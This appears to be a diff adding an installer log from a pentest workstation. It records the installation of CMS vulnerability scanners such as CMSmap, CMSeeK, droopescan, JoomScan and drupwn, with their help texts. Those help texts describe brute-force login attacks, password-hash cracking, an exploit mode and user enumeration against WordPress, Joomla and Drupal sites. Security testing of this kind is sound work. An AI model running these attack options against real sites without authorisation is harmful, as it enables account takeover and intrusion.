@@ -1,0 +1,2066 @@
+[2026-03-04 13:55:01] Installing user-level dependencies as: spabam
+[2026-03-04 13:55:01] RUN(user:spabam): gem install --user-install wpscan
+installer.sh: line 131: gem: command not found
+[2026-03-04 13:55:01] SKIP: WPScan - gem install failed (missing ruby headers). Re-run with --system-deps.
+[2026-03-04 13:55:01] WARN: WPScan requires ruby development headers (ruby-dev) and build tools for gem native extensions.
+[2026-03-04 13:55:01] RUN(user:spabam): git -C /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSmap pull --ff-only
+Already up to date.
+[2026-03-04 13:55:01] RUN(user:spabam): python3 -m venv /home/spabam/.venv/cms_scanner/cmsmap
+[2026-03-04 13:55:03] RUN(user:spabam): /home/spabam/.venv/cms_scanner/cmsmap/bin/python -
+[2026-03-04 13:55:03] RUN(user:spabam): /home/spabam/.venv/cms_scanner/cmsmap/bin/pip install --upgrade pip
+Requirement already satisfied: pip in /home/spabam/.venv/cms_scanner/cmsmap/lib/python3.13/site-packages (25.1.1)
+Collecting pip
+  Downloading pip-26.0.1-py3-none-any.whl.metadata (4.7 kB)
+Downloading pip-26.0.1-py3-none-any.whl (1.8 MB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.8/1.8 MB 33.8 MB/s eta 0:00:00
+Installing collected packages: pip
+  Attempting uninstall: pip
+    Found existing installation: pip 25.1.1
+    Uninstalling pip-25.1.1:
+      Successfully uninstalled pip-25.1.1
+Successfully installed pip-26.0.1
+[2026-03-04 13:55:03] RUN(user:spabam): /home/spabam/.venv/cms_scanner/cmsmap/bin/python -
+[2026-03-04 13:55:03] RUN(user:spabam): /home/spabam/.venv/cms_scanner/cmsmap/bin/pip install /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSmap
+Processing ./tools/CMSmap
+  Installing build dependencies: started
+  Installing build dependencies: finished with status 'done'
+  Getting requirements to build wheel: started
+  Getting requirements to build wheel: finished with status 'done'
+  Preparing metadata (pyproject.toml): started
+  Preparing metadata (pyproject.toml): finished with status 'done'
+Building wheels for collected packages: cmsmap
+  Building wheel for cmsmap (pyproject.toml): started
+  Building wheel for cmsmap (pyproject.toml): finished with status 'done'
+  Created wheel for cmsmap: filename=cmsmap-1.0-py3-none-any.whl size=451945 sha256=797bd657fe93abdd6d21c8ac013ff0c7298f75c7976c3e2e9d14120a2e272ba1
+  Stored in directory: /tmp/pip-ephem-wheel-cache-9o1cs7sg/wheels/e4/17/f4/9f5400ae976dfc75a31bcded58d62a5e21199f4edd4f4e1060
+Successfully built cmsmap
+Installing collected packages: cmsmap
+Successfully installed cmsmap-1.0
+usage: cmsmap [-f W/J/D/M] [-F] [-t ] [-a ] [-H ] [-i ] [-o ] [-E] [-c] [-s]
+              [-d] [-u ] [-p ] [-x] [-k ] [-w ] [-v] [-h] [-D] [-U ]
+              [target]
+
+CMSmap tool v1.0 - Simple CMS Scanner
+Author: Mike Manzotti
+
+Scan:
+  target               target URL (e.g. 'https://example.com:8080/')
+  -f, --force W/J/D/M  force scan (W)ordpress, (J)oomla or (D)rupal or (M)oodle
+  -F, --fullscan       full scan using large plugin lists. False positives and slow!
+  -t, --threads        number of threads (Default 5)
+  -a, --agent          set custom user-agent
+  -H, --header         add custom header (e.g. 'Authorization: Basic ABCD...')
+  -i, --input          scan multiple targets listed in a given file
+  -o, --output         save output in a file
+  -E, --noedb          enumerate plugins without searching exploits
+  -c, --nocleanurls    disable clean urls for Drupal only
+  -s, --nosslcheck     don't validate the server's certificate
+  -d, --dictattack     run low intense dictionary attack during scanning (5 attempts per user)
+
+Brute-Force:
+  -u, --usr            username or username file
+  -p, --psw            password or password file
+  -x, --noxmlrpc       brute forcing WordPress without XML-RPC
+
+Post Exploitation:
+  -k, --crack          password hashes file (Require hashcat installed. For WordPress and Joomla only)
+  -w, --wordlist       wordlist file
+
+Others:
+  -v, --verbose        verbose mode (Default false)
+  -h, --help           show this help message and exit
+  -D, --default        run CMSmap with default options
+  -U, --update         use (C)MSmap, (P)lugins or (PC) for both
+
+Examples:
+  cmsmap.py https://example.com
+  cmsmap.py https://example.com -f W -F --noedb -d
+  cmsmap.py https://example.com -i targets.txt -o output.txt
+  cmsmap.py https://example.com -u admin -p passwords.txt
+  cmsmap.py -k hashes.txt -w passwords.txt
+        
+[2026-03-04 13:55:05] OK: CMSmap installed
+[2026-03-04 13:55:05] RUN(user:spabam): git -C /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSeeK pull --ff-only
+Already up to date.
+[2026-03-04 13:55:05] RUN(user:spabam): python3 -m venv /home/spabam/.venv/cms_scanner/cmseek
+[2026-03-04 13:55:06] RUN(user:spabam): /home/spabam/.venv/cms_scanner/cmseek/bin/python -
+[2026-03-04 13:55:06] RUN(user:spabam): /home/spabam/.venv/cms_scanner/cmseek/bin/pip install --upgrade pip
+Requirement already satisfied: pip in /home/spabam/.venv/cms_scanner/cmseek/lib/python3.13/site-packages (25.1.1)
+Collecting pip
+  Using cached pip-26.0.1-py3-none-any.whl.metadata (4.7 kB)
+Using cached pip-26.0.1-py3-none-any.whl (1.8 MB)
+Installing collected packages: pip
+  Attempting uninstall: pip
+    Found existing installation: pip 25.1.1
+    Uninstalling pip-25.1.1:
+      Successfully uninstalled pip-25.1.1
+Successfully installed pip-26.0.1
+[2026-03-04 13:55:07] RUN(user:spabam): /home/spabam/.venv/cms_scanner/cmseek/bin/python -
+[2026-03-04 13:55:07] RUN(user:spabam): /home/spabam/.venv/cms_scanner/cmseek/bin/pip install -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSeeK/requirements.txt
+Collecting requests (from -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSeeK/requirements.txt (line 1))
+  Using cached requests-2.32.5-py3-none-any.whl.metadata (4.9 kB)
+Collecting charset_normalizer<4,>=2 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSeeK/requirements.txt (line 1))
+  Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (37 kB)
+Collecting idna<4,>=2.5 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSeeK/requirements.txt (line 1))
+  Using cached idna-3.11-py3-none-any.whl.metadata (8.4 kB)
+Collecting urllib3<3,>=1.21.1 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSeeK/requirements.txt (line 1))
+  Using cached urllib3-2.6.3-py3-none-any.whl.metadata (6.9 kB)
+Collecting certifi>=2017.4.17 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSeeK/requirements.txt (line 1))
+  Downloading certifi-2026.2.25-py3-none-any.whl.metadata (2.5 kB)
+Using cached requests-2.32.5-py3-none-any.whl (64 kB)
+Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (153 kB)
+Using cached idna-3.11-py3-none-any.whl (71 kB)
+Using cached urllib3-2.6.3-py3-none-any.whl (131 kB)
+Downloading certifi-2026.2.25-py3-none-any.whl (153 kB)
+Installing collected packages: urllib3, idna, charset_normalizer, certifi, requests
+
+Successfully installed certifi-2026.2.25 charset_normalizer-3.4.4 idna-3.11 requests-2.32.5 urllib3-2.6.3
+[2026-03-04 13:55:07] RUN(user:spabam): /home/spabam/.venv/cms_scanner/cmseek/bin/python /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSeeK/cmseek.py --help
+
+CMSeeK Version 1.1.3
+Github: https://github.com/Tuhinshubhra/CMSeeK
+Coded By:[91m[1m @r3dhax0r [0m
+
+USAGE:
+       python3 cmseek.py (for guided scanning) OR
+       python3 cmseek.py [OPTIONS] <Target Specification>
+
+SPECIFING TARGET:
+      -u URL, --url URL            Target Url
+      -l LIST, --list LIST         Path of the file containing list of sites
+                                   for multi-site scan (comma separated or one-per-line)
+
+MANIPULATING SCAN:
+      -i cms, --ignore--cms cms    Specify which CMS IDs to skip in order to
+                                   avoid flase positive. separated by comma ","
+
+      --strict-cms cms             Checks target against a list of provided
+                                   CMS IDs. separated by comma ","
+
+      --skip-scanned               Skips target if it's CMS was previously detected.
+
+      --light-scan                 Skips Deep Scan. Does CMS and version detection only.
+
+      -o, --only-cms               Only detect CMS, ignore deep scan and version detection.
+
+RE-DIRECT:
+      --follow-redirect            Follows all/any redirect(s)
+      --no-redirect                Skips all redirects and tests the input target(s)
+
+USER AGENT:
+      -r, --random-agent           Use a random user agent
+      --googlebot                  Use Google bot user agent
+      --user-agent USER_AGENT      Specify a custom user agent
+
+OUTPUT:
+      -v, --verbose                Increase output verbosity
+
+VERSION & UPDATING:
+      --update                     Update CMSeeK (Requires git)
+      --version                    Show CMSeeK version and exit
+
+HELP & MISCELLANEOUS:
+      -h, --help                   Show this help message and exit
+      --clear-result               Delete all the scan result
+      --batch                      Never ask you to press enter after every site in a list is scanned
+
+EXAMPLE USAGE:
+      python3 cmseek.py -u example.com                           # Scan example.com
+      python3 cmseek.py -l /home/user/target.txt                 # Scan the sites specified in target.txt (comma separated)
+      python3 cmseek.py -u example.com --user-agent Mozilla 5.0  # Scan example.com using custom user-Agent Mozilla is 5.0 used here
+      python3 cmseek.py -u example.com --random-agent            # Scan example.com using a random user-Agent
+      python3 cmseek.py -v -u example.com                        # enabling verbose output while scanning example.com
+
+    
+
+[1m[91m CMSeeK says ~ Annyeong[0m
+[2026-03-04 13:55:07] OK: CMSeek installed
+[2026-03-04 13:55:07] RUN(user:spabam): python3 -m venv /home/spabam/.venv/cms_scanner/droopescan
+[2026-03-04 13:55:08] RUN(user:spabam): /home/spabam/.venv/cms_scanner/droopescan/bin/python -
+[2026-03-04 13:55:09] RUN(user:spabam): /home/spabam/.venv/cms_scanner/droopescan/bin/pip install --upgrade pip
+Requirement already satisfied: pip in /home/spabam/.venv/cms_scanner/droopescan/lib/python3.13/site-packages (25.1.1)
+Collecting pip
+  Using cached pip-26.0.1-py3-none-any.whl.metadata (4.7 kB)
+Using cached pip-26.0.1-py3-none-any.whl (1.8 MB)
+Installing collected packages: pip
+  Attempting uninstall: pip
+    Found existing installation: pip 25.1.1
+    Uninstalling pip-25.1.1:
+      Successfully uninstalled pip-25.1.1
+Successfully installed pip-26.0.1
+[2026-03-04 13:55:09] RUN(user:spabam): /home/spabam/.venv/cms_scanner/droopescan/bin/python -
+[2026-03-04 13:55:09] RUN(user:spabam): /home/spabam/.venv/cms_scanner/droopescan/bin/pip install droopescan
+Collecting droopescan
+  Downloading droopescan-1.45.1-py2.py3-none-any.whl.metadata (6.8 kB)
+Collecting cement<2.6.99,>=2.6 (from droopescan)
+  Downloading cement-2.6.2.tar.gz (140 kB)
+  Installing build dependencies: started
+  Installing build dependencies: finished with status 'done'
+  Getting requirements to build wheel: started
+  Getting requirements to build wheel: finished with status 'done'
+  Preparing metadata (pyproject.toml): started
+  Preparing metadata (pyproject.toml): finished with status 'done'
+Collecting pystache (from droopescan)
+  Downloading pystache-0.6.8-py3-none-any.whl.metadata (14 kB)
+Collecting requests (from droopescan)
+  Using cached requests-2.32.5-py3-none-any.whl.metadata (4.9 kB)
+Collecting charset_normalizer<4,>=2 (from requests->droopescan)
+  Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (37 kB)
+Collecting idna<4,>=2.5 (from requests->droopescan)
+  Using cached idna-3.11-py3-none-any.whl.metadata (8.4 kB)
+Collecting urllib3<3,>=1.21.1 (from requests->droopescan)
+  Using cached urllib3-2.6.3-py3-none-any.whl.metadata (6.9 kB)
+Collecting certifi>=2017.4.17 (from requests->droopescan)
+  Using cached certifi-2026.2.25-py3-none-any.whl.metadata (2.5 kB)
+Downloading droopescan-1.45.1-py2.py3-none-any.whl (514 kB)
+Downloading pystache-0.6.8-py3-none-any.whl (82 kB)
+Using cached requests-2.32.5-py3-none-any.whl (64 kB)
+Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (153 kB)
+Using cached idna-3.11-py3-none-any.whl (71 kB)
+Using cached urllib3-2.6.3-py3-none-any.whl (131 kB)
+Using cached certifi-2026.2.25-py3-none-any.whl (153 kB)
+Building wheels for collected packages: cement
+  Building wheel for cement (pyproject.toml): started
+  Building wheel for cement (pyproject.toml): finished with status 'done'
+  Created wheel for cement: filename=cement-2.6.2-py3-none-any.whl size=80938 sha256=29184c9e7df7fb98479d5605490695ea3afae388d6ee8c7790489ecad36bfd42
+  Stored in directory: /home/spabam/.cache/pip/wheels/cf/a6/2c/7db83cc59ae145c484b723792f5c3804614308c1b155f49593
+Successfully built cement
+Installing collected packages: cement, urllib3, pystache, idna, charset_normalizer, certifi, requests, droopescan
+
+Successfully installed cement-2.6.2 certifi-2026.2.25 charset_normalizer-3.4.4 droopescan-1.45.1 idna-3.11 pystache-0.6.8 requests-2.32.5 urllib3-2.6.3
+[2026-03-04 13:55:11] RUN(user:spabam): /home/spabam/.venv/cms_scanner/droopescan/bin/python -
+usage: droopescan (sub-commands ...) [options ...] {arguments ...}
+
+    |
+ ___| ___  ___  ___  ___  ___  ___  ___  ___  ___
+|   )|   )|   )|   )|   )|___)|___ |    |   )|   )
+|__/ |    |__/ |__/ |__/ |__   __/ |__  |__/||  /
+                    |
+=================================================
+
+commands:
+
+  scan
+    cms scanning functionality.
+
+  stats
+    shows scanner status & capabilities.
+
+options:
+  -h, --help  show this help message and exit
+  --debug     toggle debug output
+  --quiet     suppress all output
+
+Example invocations: 
+  droopescan scan drupal -u URL_HERE
+  droopescan scan silverstripe -u URL_HERE
+
+More info: 
+  droopescan scan --help
+ 
+Please see the README file for information regarding proxies.
+[2026-03-04 13:55:11] OK: Droopescan installed
+[2026-03-04 13:55:11] RUN(user:spabam): git -C /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/joomscan pull --ff-only
+Already up to date.
+[H[2J[3J[33m
+    ____  _____  _____  __  __  ___   ___    __    _  _ 
+   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
+  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
+  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
+[31m			(1337.today)[0m
+   
+    --=[[34mOWASP JoomScan[0m
+    +---++---==[Version : [31m0.0.7
+[0m    +---++---==[Update Date : [[31m2018/09/23[0m]
+    +---++---==[Authors : [31mMohammad Reza Espargham , Ali Razmjoo[0m
+    --=[Code name : [31mSelf Challenge[0m
+    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP
+
+[36m   
+
+Help :
+
+Usage:	/home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/joomscan/joomscan.pl [options]
+
+--url | -u <URL>                |   The Joomla URL/domain to scan.
+--mass | -m <filename>          |   Cycle through URLs provided in txt file
+--enumerate-components | -ec    |   Try to enumerate components.
+--joomla-version | -jv          |   Output target Joomla version and exit without further checks
+--no-report | -nr               |   Do not produce a report  
+
+--cookie <String>               |   Set cookie.
+--user-agent | -a <User-Agent>  |   Use the specified User-Agent.
+--random-agent | -r             |   Use a random User-Agent.
+--timeout <Time-Out>            |   Set timeout.
+--proxy=PROXY                   |   Use a proxy to connect to the target URL
+           Proxy example: --proxy http://127.0.0.1:8080
+                                  https://127.0.0.1:443
+                                  socks://127.0.0.1:414
+                       
+--about                         |   About Author
+--update                        |   Update to the latest version.
+--help | -h                     |   This help screen.
+--version                       |   Output the current joomscan version and exit.
+
+
+[0m
+[2026-03-04 13:55:11] OK: JoomScan installed
+[2026-03-04 13:55:11] RUN(user:spabam): git -C /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/drupwn pull --ff-only
+Already up to date.
+[2026-03-04 13:55:12] RUN(user:spabam): python3 -m venv /home/spabam/.venv/cms_scanner/drupwn-modern
+[2026-03-04 13:55:13] RUN(user:spabam): /home/spabam/.venv/cms_scanner/drupwn-modern/bin/python -
+[2026-03-04 13:55:13] RUN(user:spabam): /home/spabam/.venv/cms_scanner/drupwn-modern/bin/pip install --upgrade pip
+Requirement already satisfied: pip in /home/spabam/.venv/cms_scanner/drupwn-modern/lib/python3.13/site-packages (25.1.1)
+Collecting pip
+  Using cached pip-26.0.1-py3-none-any.whl.metadata (4.7 kB)
+Using cached pip-26.0.1-py3-none-any.whl (1.8 MB)
+Installing collected packages: pip
+  Attempting uninstall: pip
+    Found existing installation: pip 25.1.1
+    Uninstalling pip-25.1.1:
+      Successfully uninstalled pip-25.1.1
+Successfully installed pip-26.0.1
+[2026-03-04 13:55:13] RUN(user:spabam): /home/spabam/.venv/cms_scanner/drupwn-modern/bin/python -
+[2026-03-04 13:55:13] RUN(user:spabam): /home/spabam/.venv/cms_scanner/drupwn-modern/bin/pip install setuptools<81
+Collecting setuptools<81
+  Downloading setuptools-80.10.2-py3-none-any.whl.metadata (6.6 kB)
+Downloading setuptools-80.10.2-py3-none-any.whl (1.1 MB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.1/1.1 MB 29.0 MB/s  0:00:00
+Installing collected packages: setuptools
+Successfully installed setuptools-80.10.2
+[2026-03-04 13:55:14] RUN(user:spabam): /home/spabam/.venv/cms_scanner/drupwn-modern/bin/pip install -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/drupwn/requirements.txt
+Collecting requests (from -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/drupwn/requirements.txt (line 1))
+  Using cached requests-2.32.5-py3-none-any.whl.metadata (4.9 kB)
+Collecting pysocks (from -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/drupwn/requirements.txt (line 2))
+  Downloading PySocks-1.7.1-py3-none-any.whl.metadata (13 kB)
+Collecting veryprettytable (from -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/drupwn/requirements.txt (line 3))
+  Downloading veryprettytable-0.8.1.tar.gz (16 kB)
+  Installing build dependencies: started
+  Installing build dependencies: finished with status 'done'
+  Getting requirements to build wheel: started
+  Getting requirements to build wheel: finished with status 'done'
+  Preparing metadata (pyproject.toml): started
+  Preparing metadata (pyproject.toml): finished with status 'done'
+Collecting prompt_toolkit>=2.0.7 (from -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/drupwn/requirements.txt (line 4))
+  Downloading prompt_toolkit-3.0.52-py3-none-any.whl.metadata (6.4 kB)
+Collecting charset_normalizer<4,>=2 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/drupwn/requirements.txt (line 1))
+  Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (37 kB)
+Collecting idna<4,>=2.5 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/drupwn/requirements.txt (line 1))
+  Using cached idna-3.11-py3-none-any.whl.metadata (8.4 kB)
+Collecting urllib3<3,>=1.21.1 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/drupwn/requirements.txt (line 1))
+  Using cached urllib3-2.6.3-py3-none-any.whl.metadata (6.9 kB)
+Collecting certifi>=2017.4.17 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/drupwn/requirements.txt (line 1))
+  Using cached certifi-2026.2.25-py3-none-any.whl.metadata (2.5 kB)
+Collecting termcolor (from veryprettytable->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/drupwn/requirements.txt (line 3))
+  Downloading termcolor-3.3.0-py3-none-any.whl.metadata (6.5 kB)
+Collecting colorama (from veryprettytable->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/drupwn/requirements.txt (line 3))
+  Downloading colorama-0.4.6-py2.py3-none-any.whl.metadata (17 kB)
+Collecting wcwidth (from prompt_toolkit>=2.0.7->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/drupwn/requirements.txt (line 4))
+  Downloading wcwidth-0.6.0-py3-none-any.whl.metadata (30 kB)
+Using cached requests-2.32.5-py3-none-any.whl (64 kB)
+Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (153 kB)
+Using cached idna-3.11-py3-none-any.whl (71 kB)
+Using cached urllib3-2.6.3-py3-none-any.whl (131 kB)
+Downloading PySocks-1.7.1-py3-none-any.whl (16 kB)
+Downloading prompt_toolkit-3.0.52-py3-none-any.whl (391 kB)
+Using cached certifi-2026.2.25-py3-none-any.whl (153 kB)
+Downloading colorama-0.4.6-py2.py3-none-any.whl (25 kB)
+Downloading termcolor-3.3.0-py3-none-any.whl (7.7 kB)
+Downloading wcwidth-0.6.0-py3-none-any.whl (94 kB)
+Building wheels for collected packages: veryprettytable
+  Building wheel for veryprettytable (pyproject.toml): started
+  Building wheel for veryprettytable (pyproject.toml): finished with status 'done'
+  Created wheel for veryprettytable: filename=veryprettytable-0.8.1-py3-none-any.whl size=15562 sha256=5fdb204c9e3fbb1bd81be301cff7a2812d6ba8801528636f6446ab6eb3e6cf96
+  Stored in directory: /home/spabam/.cache/pip/wheels/d1/9b/8d/3efa060758666678d66a7dc23a0619c98d5716fe70e41c20a0
+Successfully built veryprettytable
+Installing collected packages: wcwidth, urllib3, termcolor, pysocks, idna, colorama, charset_normalizer, certifi, veryprettytable, requests, prompt_toolkit
+
+Successfully installed certifi-2026.2.25 charset_normalizer-3.4.4 colorama-0.4.6 idna-3.11 prompt_toolkit-3.0.52 pysocks-1.7.1 requests-2.32.5 termcolor-3.3.0 urllib3-2.6.3 veryprettytable-0.8.1 wcwidth-0.6.0
+[2026-03-04 13:55:16] RUN(user:spabam): rm -rf /home/spabam/.venv/cms_scanner/_build/drupwn-src
+[2026-03-04 13:55:16] RUN(user:spabam): mkdir -p /home/spabam/.venv/cms_scanner/_build
+[2026-03-04 13:55:16] RUN(user:spabam): cp -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/drupwn /home/spabam/.venv/cms_scanner/_build/drupwn-src
+[2026-03-04 13:55:16] RUN(user:spabam): rm -rf /home/spabam/.venv/cms_scanner/_build/drupwn-src/build /home/spabam/.venv/cms_scanner/_build/drupwn-src/dist
+[2026-03-04 13:55:16] RUN(user:spabam): /home/spabam/.venv/cms_scanner/drupwn-modern/bin/pip install /home/spabam/.venv/cms_scanner/_build/drupwn-src
+Processing /home/spabam/.venv/cms_scanner/_build/drupwn-src
+  Installing build dependencies: started
+  Installing build dependencies: finished with status 'done'
+  Getting requirements to build wheel: started
+  Getting requirements to build wheel: finished with status 'done'
+  Preparing metadata (pyproject.toml): started
+  Preparing metadata (pyproject.toml): finished with status 'done'
+Requirement already satisfied: requests in /home/spabam/.venv/cms_scanner/drupwn-modern/lib/python3.13/site-packages (from drupwn==1.0.3) (2.32.5)
+Requirement already satisfied: veryprettytable in /home/spabam/.venv/cms_scanner/drupwn-modern/lib/python3.13/site-packages (from drupwn==1.0.3) (0.8.1)
+Collecting prompt_toolkit<=2.0.7 (from drupwn==1.0.3)
+  Downloading prompt_toolkit-2.0.7-py3-none-any.whl.metadata (10 kB)
+Requirement already satisfied: pysocks in /home/spabam/.venv/cms_scanner/drupwn-modern/lib/python3.13/site-packages (from drupwn==1.0.3) (1.7.1)
+Collecting bs4 (from drupwn==1.0.3)
+  Downloading bs4-0.0.2-py2.py3-none-any.whl.metadata (411 bytes)
+Collecting six>=1.9.0 (from prompt_toolkit<=2.0.7->drupwn==1.0.3)
+  Downloading six-1.17.0-py2.py3-none-any.whl.metadata (1.7 kB)
+Requirement already satisfied: wcwidth in /home/spabam/.venv/cms_scanner/drupwn-modern/lib/python3.13/site-packages (from prompt_toolkit<=2.0.7->drupwn==1.0.3) (0.6.0)
+Collecting beautifulsoup4 (from bs4->drupwn==1.0.3)
+  Using cached beautifulsoup4-4.14.3-py3-none-any.whl.metadata (3.8 kB)
+Collecting soupsieve>=1.6.1 (from beautifulsoup4->bs4->drupwn==1.0.3)
+  Using cached soupsieve-2.8.3-py3-none-any.whl.metadata (4.6 kB)
+Collecting typing-extensions>=4.0.0 (from beautifulsoup4->bs4->drupwn==1.0.3)
+  Using cached typing_extensions-4.15.0-py3-none-any.whl.metadata (3.3 kB)
+Requirement already satisfied: charset_normalizer<4,>=2 in /home/spabam/.venv/cms_scanner/drupwn-modern/lib/python3.13/site-packages (from requests->drupwn==1.0.3) (3.4.4)
+Requirement already satisfied: idna<4,>=2.5 in /home/spabam/.venv/cms_scanner/drupwn-modern/lib/python3.13/site-packages (from requests->drupwn==1.0.3) (3.11)
+Requirement already satisfied: urllib3<3,>=1.21.1 in /home/spabam/.venv/cms_scanner/drupwn-modern/lib/python3.13/site-packages (from requests->drupwn==1.0.3) (2.6.3)
+Requirement already satisfied: certifi>=2017.4.17 in /home/spabam/.venv/cms_scanner/drupwn-modern/lib/python3.13/site-packages (from requests->drupwn==1.0.3) (2026.2.25)
+Requirement already satisfied: termcolor in /home/spabam/.venv/cms_scanner/drupwn-modern/lib/python3.13/site-packages (from veryprettytable->drupwn==1.0.3) (3.3.0)
+Requirement already satisfied: colorama in /home/spabam/.venv/cms_scanner/drupwn-modern/lib/python3.13/site-packages (from veryprettytable->drupwn==1.0.3) (0.4.6)
+Downloading prompt_toolkit-2.0.7-py3-none-any.whl (338 kB)
+Downloading six-1.17.0-py2.py3-none-any.whl (11 kB)
+Downloading bs4-0.0.2-py2.py3-none-any.whl (1.2 kB)
+Using cached beautifulsoup4-4.14.3-py3-none-any.whl (107 kB)
+Using cached soupsieve-2.8.3-py3-none-any.whl (37 kB)
+Using cached typing_extensions-4.15.0-py3-none-any.whl (44 kB)
+Building wheels for collected packages: drupwn
+  Building wheel for drupwn (pyproject.toml): started
+  Building wheel for drupwn (pyproject.toml): finished with status 'done'
+  Created wheel for drupwn: filename=drupwn-1.0.3-py3-none-any.whl size=37302 sha256=1a7ba2b54baa0d1e55b23447bb60372916d173a10452c4bd79dcc431c3445ede
+  Stored in directory: /home/spabam/.cache/pip/wheels/c7/09/35/97d69bcd34475de800e60f32dd4c3e944ec55798f202c978f2
+Successfully built drupwn
+Installing collected packages: typing-extensions, soupsieve, six, prompt_toolkit, beautifulsoup4, bs4, drupwn
+  Attempting uninstall: prompt_toolkit
+    Found existing installation: prompt_toolkit 3.0.52
+    Uninstalling prompt_toolkit-3.0.52:
+      Successfully uninstalled prompt_toolkit-3.0.52
+
+Successfully installed beautifulsoup4-4.14.3 bs4-0.0.2 drupwn-1.0.3 prompt_toolkit-2.0.7 six-1.17.0 soupsieve-2.8.3 typing-extensions-4.15.0
+
+        ____
+       / __ \_______  ______ _      ______
+      / / / / ___/ / / / __ \ | /| / / __ \
+     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /
+    /_____/_/   \__,_/ .___/|__/|__/_/ /_/
+                     /_/
+    
+usage: drupwn [-h] [--mode MODE] [--target TARGET] [--users] [--nodes]
+              [--modules] [--dfiles] [--themes] [--version VERSION]
+              [--cookies COOKIES] [--thread THREAD] [--range RANGE] [--ua UA]
+              [--bauth BAUTH] [--delay DELAY] [--log] [--update]
+              [--proxy PROXY | --proxies PROXIES]
+
+Drupwn aims to automate drupal information gathering.
+
+options:
+  -h, --help         show this help message and exit
+  --mode MODE        enum|exploit
+  --target TARGET    hostname to scan
+  --users            user enumaration
+  --nodes            node enumeration
+  --modules          module enumeration
+  --dfiles           default files enumeration
+  --themes           theme enumeration
+  --version VERSION  Drupal version
+  --cookies COOKIES  cookies
+  --thread THREAD    threads number
+  --range RANGE      enumeration range
+  --ua UA            User Agent
+  --bauth BAUTH      Basic authentication
+  --delay DELAY      request delay
+  --log              file logging
+  --update           update plugins and themes
+  --proxy PROXY      [http|https|socks]://host:port
+  --proxies PROXIES  Proxies file
+[2026-03-04 13:55:18] OK: Drupwn installed
+[2026-03-04 13:55:18] RUN(user:spabam): git -C /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/vbscan pull --ff-only
+Already up to date.
+[2026-03-04 13:55:18] OK: VBScan installed
+[2026-03-04 13:55:18] RUN(user:spabam): git -C /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan pull --ff-only
+Already up to date.
